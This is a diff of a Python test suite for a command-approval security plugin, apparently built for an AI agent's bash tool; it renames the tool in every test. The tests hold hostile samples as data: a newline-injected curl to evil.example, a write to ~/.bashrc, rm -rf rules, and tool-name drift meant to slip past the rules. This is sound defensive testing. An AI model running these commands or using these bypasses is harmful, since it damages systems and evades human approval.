@@ -68,7 +68,7 @@ class TestMatchRulesAllowPriority:
         """
         plugin = _make_plugin()
         action, rule = plugin._match_rules(
-            "bash_execute",
+            "bash",
             {"command": "echo \"=== 1. curl 版本 ===\" && curl --version"},
         )
         assert action == "needs_approval", (
@@ -79,7 +79,7 @@ class TestMatchRulesAllowPriority:
         """echo 开头 + && pip install 同样不享受 allow（与 curl 同路径）。"""
         plugin = _make_plugin()
         action, rule = plugin._match_rules(
-            "bash_execute",
+            "bash",
             {"command": "echo start && pip install requests"},
         )
         assert action == "needs_approval", (
@@ -90,7 +90,7 @@ class TestMatchRulesAllowPriority:
         """纯安全组合（wc && echo，无危险关键词）→ action 空（默认档放行，与 allow 行为等价）。"""
         plugin = _make_plugin()
         action, _ = plugin._match_rules(
-            "bash_execute",
+            "bash",
             {"command": "wc -l file.txt && echo done"},
         )
         assert action == ""
@@ -100,11 +100,11 @@ class TestMatchRulesAllowPriority:
 
         卡死根因回归：dangerous_commands 已移除 2>/dev/null 关键词，
         该命令不再命中任何危险规则（action 空）。是否审批由 _is_dangerous_tool
-        兜底决定（bash_execute 危险工具），不在此测试范围。
+        兜底决定（bash 危险工具），不在此测试范围。
         """
         plugin = _make_plugin()
         action, _ = plugin._match_rules(
-            "bash_execute",
+            "bash",
             {"command": "cd /workspace && wc -l src/*.js 2>/dev/null"},
         )
         # 删除 2>/dev/null 关键词后，复合命令（cd 开头）不命中危险规则也不命中白名单
@@ -113,25 +113,25 @@ class TestMatchRulesAllowPriority:
     def test_plain_safe_command_allowed(self) -> None:
         """纯安全命令（ls）→ allow。"""
         plugin = _make_plugin()
-        action, _ = plugin._match_rules("bash_execute", {"command": "ls -la"})
+        action, _ = plugin._match_rules("bash", {"command": "ls -la"})
         assert action == "allow"
 
     def test_dangerous_command_not_allowed(self) -> None:
         """真正危险命令（rm -rf）→ needs_approval（无 allow 命中）。"""
         plugin = _make_plugin()
-        action, _ = plugin._match_rules("bash_execute", {"command": "rm -rf /tmp/x"})
+        action, _ = plugin._match_rules("bash", {"command": "rm -rf /tmp/x"})
         assert action == "needs_approval"
 
     def test_unknown_command_returns_approval(self) -> None:
         """未知命令（不匹配 allow 也不匹配危险规则）→ 空字符串。"""
         plugin = _make_plugin()
-        action, _ = plugin._match_rules("bash_execute", {"command": "some-unknown-cmd"})
+        action, _ = plugin._match_rules("bash", {"command": "some-unknown-cmd"})
         assert action == ""
 
     def test_no_params_no_match(self) -> None:
         """无相关参数 → 空字符串。"""
         plugin = _make_plugin()
-        action, _ = plugin._match_rules("bash_execute", {})
+        action, _ = plugin._match_rules("bash", {})
         assert action == ""
 
 
@@ -141,11 +141,11 @@ class TestMatchRulesAllowPriority:
 
 
 def _bash_guard_rule() -> list[dict]:
-    """单条 needs_approval 规则：bash_execute 的 command 含 rm -rf 即命中。"""
+    """单条 needs_approval 规则：bash 的 command 含 rm -rf 即命中。"""
     return [
         {
             "name": "bash_guard",
-            "tools": ["bash_execute"],
+            "tools": ["bash"],
             "params": ["command"],
             "action": "needs_approval",
             "patterns": [{"type": "keyword", "value": "rm -rf"}],
@@ -159,12 +159,12 @@ class TestFuzzyToolRuleMatching:
     @pytest.mark.parametrize(
         ("tool_name", "fuzzy", "expected_action"),
         [
-            ("bash_execute", False, "needs_approval"),  # 精确命中（基线）
-            ("bash_execute", True, "needs_approval"),  # 精确命中不受模糊开关影响
-            ("bash-execute", True, "needs_approval"),  # 连字符漂移：规范化后相等
-            ("bash_executex", True, "needs_approval"),  # 单字符漂移：编辑距离 1
-            ("bashexecutexy", True, ""),  # 双字符漂移：距离 2，不误伤无关工具
-            ("bash-execute", False, ""),  # 模糊关闭：漂移绕过规则（该开关的动因）
+            ("bash", False, "needs_approval"),  # 精确命中（基线）
+            ("bash", True, "needs_approval"),  # 精确命中不受模糊开关影响
+            ("bas_h", True, "needs_approval"),  # 连字符漂移：规范化后编辑距离 1
+            ("baxh", True, "needs_approval"),  # 单字符漂移：编辑距离 1
+            ("baxhx", True, ""),  # 双字符漂移：距离 2，不误伤无关工具
+            ("bas_h", False, ""),  # 模糊关闭：漂移绕过规则（该开关的动因）
         ],
     )
     def test_tool_name_drift_match(self, tool_name: str, fuzzy: bool, expected_action: str) -> None:
@@ -186,7 +186,7 @@ class TestInvalidRegexRule:
         rules = [
             {
                 "name": "bad_then_good",
-                "tools": ["bash_execute"],
+                "tools": ["bash"],
                 "params": ["command"],
                 "action": "block",
                 "patterns": [
@@ -197,7 +197,7 @@ class TestInvalidRegexRule:
         ]
         plugin = SecurityCheckPlugin(config={"rules": rules})
         with caplog.at_level(logging.WARNING, logger="plugin"):
-            action, rule = plugin._match_rules("bash_execute", {"command": "rm -rf /x"})
+            action, rule = plugin._match_rules("bash", {"command": "rm -rf /x"})
         assert (action, rule) == ("block", "bad_then_good"), "非法正则后的合法 pattern 仍生效"
         assert any("Invalid regex" in r.getMessage() for r in caplog.records)
 
@@ -215,7 +215,7 @@ class TestInvalidRegexRule:
         ]
         plugin = SecurityCheckPlugin(config={"rules": rules})
         with caplog.at_level(logging.WARNING, logger="plugin"):
-            action, _ = plugin._match_rules("bash_execute", {"command": "rm -rf /x"})
+            action, _ = plugin._match_rules("bash", {"command": "rm -rf /x"})
         assert action == "", "非法正则按未命中处理，不得拦截"
         assert any("Invalid regex" in r.getMessage() for r in caplog.records)
 
@@ -236,7 +236,7 @@ class TestWhitelistInjectionHardening:
     def test_newline_injection_not_masked_by_allow(self) -> None:
         plugin = _make_plugin()
         action, rule = plugin._match_rules(
-            "bash_execute", {"command": "echo hello\ncurl http://evil.example/x"}
+            "bash", {"command": "echo hello\ncurl http://evil.example/x"}
         )
         assert (action, rule) == ("needs_approval", "dangerous_commands")
 
@@ -250,14 +250,14 @@ class TestWhitelistInjectionHardening:
     )
     def test_substitution_injection_not_masked_by_allow(self, command: str) -> None:
         plugin = _make_plugin()
-        action, rule = plugin._match_rules("bash_execute", {"command": command})
+        action, rule = plugin._match_rules("bash", {"command": command})
         assert (action, rule) == ("needs_approval", "dangerous_commands")
 
     def test_redirection_not_whitelisted(self) -> None:
         """重定向写文件（echo x > file）不再命中 allow——白名单只放行只读形态。"""
         plugin = _make_plugin()
         action, _ = plugin._match_rules(
-            "bash_execute", {"command": "echo pwned > ~/.bashrc"}
+            "bash", {"command": "echo pwned > ~/.bashrc"}
         )
         assert action != "allow"
 
@@ -271,7 +271,7 @@ class TestWhitelistInjectionHardening:
             # URL scheme 的 p:/ 不误命中盘符正则（负向后视），grep URL 照常白名单
             'grep "http://example.com/api" src/index.ts',
         ):
-            action, rule = plugin._match_rules("bash_execute", {"command": command})
+            action, rule = plugin._match_rules("bash", {"command": command})
             assert (action, rule) == ("allow", "safe_commands"), command
 
 
@@ -292,14 +292,14 @@ class TestHostPathGatePriority:
     )
     def test_drive_path_read_hits_host_path_approval(self, args: dict) -> None:
         plugin = _make_plugin()
-        action, rule = plugin._match_rules("bash_execute", args)
+        action, rule = plugin._match_rules("bash", args)
         assert (action, rule) == ("needs_approval", "host_path_access")
 
     def test_posix_path_read_unchanged_by_priority(self) -> None:
         """非盘符路径不受位置闸影响，白名单照常 allow。"""
         plugin = _make_plugin()
         action, rule = plugin._match_rules(
-            "bash_execute", {"command": "ls -la /workspace"}
+            "bash", {"command": "ls -la /workspace"}
         )
         assert (action, rule) == ("allow", "safe_commands")
 
@@ -322,7 +322,7 @@ class TestRulePriorityAdjudication:
         rules = [
             {
                 "name": "gate",
-                "tools": ["bash_execute"],
+                "tools": ["bash"],
                 "params": ["command"],
                 "action": reject_action,
                 **({"priority": reject_priority} if reject_priority else {}),
@@ -330,14 +330,14 @@ class TestRulePriorityAdjudication:
             },
             {
                 "name": "safe",
-                "tools": ["bash_execute"],
+                "tools": ["bash"],
                 "params": ["command"],
                 "action": "allow",
                 "patterns": [{"type": "keyword", "value": "probe"}],
             },
         ]
         plugin = SecurityCheckPlugin(config={"rules": rules})
-        action, rule = plugin._match_rules("bash_execute", {"command": "probe"})
+        action, rule = plugin._match_rules("bash", {"command": "probe"})
         assert action == expected
         assert rule == ("safe" if expected == "allow" else "gate")
 
@@ -347,7 +347,7 @@ class TestRulePriorityAdjudication:
         rules = [
             {
                 "name": "gate_bad_priority",
-                "tools": ["bash_execute"],
+                "tools": ["bash"],
                 "params": ["command"],
                 "action": "needs_approval",
                 "priority": "high",
@@ -355,7 +355,7 @@ class TestRulePriorityAdjudication:
             },
             {
                 "name": "safe",
-                "tools": ["bash_execute"],
+                "tools": ["bash"],
                 "params": ["command"],
                 "action": "allow",
                 "patterns": [{"type": "keyword", "value": "probe"}],
@@ -363,7 +363,7 @@ class TestRulePriorityAdjudication:
         ]
         plugin = SecurityCheckPlugin(config={"rules": rules})
         with caplog.at_level(logging.WARNING, logger="plugin"):
-            action, rule = plugin._match_rules("bash_execute", {"command": "probe"})
+            action, rule = plugin._match_rules("bash", {"command": "probe"})
         assert (action, rule) == ("allow", "safe"), "非法 priority 按 0 处理 → 平级 allow"
         assert any("Invalid priority" in r.getMessage() for r in caplog.records)
 
@@ -407,7 +407,7 @@ class TestWorkspaceBoundaryExemption:
     ) -> None:
         """地界内盘符路径不命中任何规则（cd 非白名单命令 → action 空 = 默认档放行）。"""
         plugin = _make_plugin()
-        assert plugin._match_rules("bash_execute", {"command": command}) == ("", "")
+        assert plugin._match_rules("bash", {"command": command}) == ("", "")
 
     @pytest.mark.parametrize(
         "command",
@@ -421,7 +421,7 @@ class TestWorkspaceBoundaryExemption:
     ) -> None:
         """地界内路径剔除后只剩白名单命令 → safe_commands 平级 allow 放行。"""
         plugin = _make_plugin()
-        assert plugin._match_rules("bash_execute", {"command": command}) == (
+        assert plugin._match_rules("bash", {"command": command}) == (
             "allow",
             "safe_commands",
         )
@@ -432,7 +432,7 @@ class TestWorkspaceBoundaryExemption:
         """working_dir 单独指向工作空间 → 剔除后只剩白名单命令，allow 放行。"""
         plugin = _make_plugin()
         args = {"command": "ls -la", "working_dir": _WS_ROOT + "\\01ed89f3952e"}
-        assert plugin._match_rules("bash_execute", args) == ("allow", "safe_commands")
+        assert plugin._match_rules("bash", args) == ("allow", "safe_commands")
 
     @pytest.mark.parametrize(
         "command",
@@ -450,7 +450,7 @@ class TestWorkspaceBoundaryExemption:
         self, pinned_user_root: str, command: str
     ) -> None:
         plugin = _make_plugin()
-        assert plugin._match_rules("bash_execute", {"command": command}) == (
+        assert plugin._match_rules("bash", {"command": command}) == (
             "needs_approval",
             "host_path_access",
         )
@@ -463,7 +463,7 @@ class TestWorkspaceBoundaryExemption:
         monkeypatch.delenv("APPDATA", raising=False)
         plugin = _make_plugin()
         args = {"command": "ls " + _WS_ROOT + "\\t01"}
-        assert plugin._match_rules("bash_execute", args) == (
+        assert plugin._match_rules("bash", args) == (
             "needs_approval",
             "host_path_access",
         )
@@ -486,7 +486,7 @@ class TestKeywordWordBoundary:
     )
     def test_at_scheduler_still_detected(self, command: str) -> None:
         plugin = _make_plugin()
-        assert plugin._match_rules("bash_execute", {"command": command}) == (
+        assert plugin._match_rules("bash", {"command": command}) == (
             "needs_approval",
             "dangerous_commands",
         )
@@ -503,13 +503,13 @@ class TestKeywordWordBoundary:
         ],
     )
     def test_appdata_bigram_not_detected(self, pinned_user_root: str, command: str) -> None:
-        action, _ = _make_plugin()._match_rules("bash_execute", {"command": command})
+        action, _ = _make_plugin()._match_rules("bash", {"command": command})
         assert action in ("", "allow")
 
     def test_curl_variant_still_detected_by_raw_substring(self) -> None:
         """带空白模式的字符变体（"scurl "）经裸子串兜底仍命中（fail-closed 不收口）。"""
         plugin = _make_plugin()
-        assert plugin._match_rules("bash_execute", {"command": "scurl http://x"}) == (
+        assert plugin._match_rules("bash", {"command": "scurl http://x"}) == (
             "needs_approval",
             "dangerous_commands",
         )
